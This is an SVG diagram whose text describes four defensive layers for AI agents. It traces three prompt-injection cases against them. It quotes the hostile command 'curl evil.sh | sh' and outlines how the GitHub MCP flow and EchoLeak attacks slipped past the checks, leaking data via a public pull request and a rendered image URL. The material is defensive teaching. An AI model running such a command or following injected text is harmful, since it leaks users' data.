<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 960 540" role="img" aria-labelledby="hrn-02-injection-defence-title" aria-describedby="hrn-02-injection-defence-desc">
<title id="hrn-02-injection-defence-title">Four layers stop a command, not a channel</title>
<desc id="hrn-02-injection-defence-desc">Three rows across four purple layer columns: untrusted by default, deny-list hook, sandbox with no egress, permission gate, and an exit column. The textbook injection curl evil.sh | sh: the model asks to run it, no rule of the deny-list matches, the sandbox blocks it because the pipe character is refused, the permission gate is not reached, and it is contained. The GitHub MCP flow (Invariant Labs, 2025): issue text taken as orders, no command to match, no socket needed, the pull request not gated; the data leaves in red through a public pull request. EchoLeak (Aim Security, 2025): the injection got past the classifier, no command to match, no socket opened, no tool call to gate; the data leaves in red through a rendered image URL.</desc>
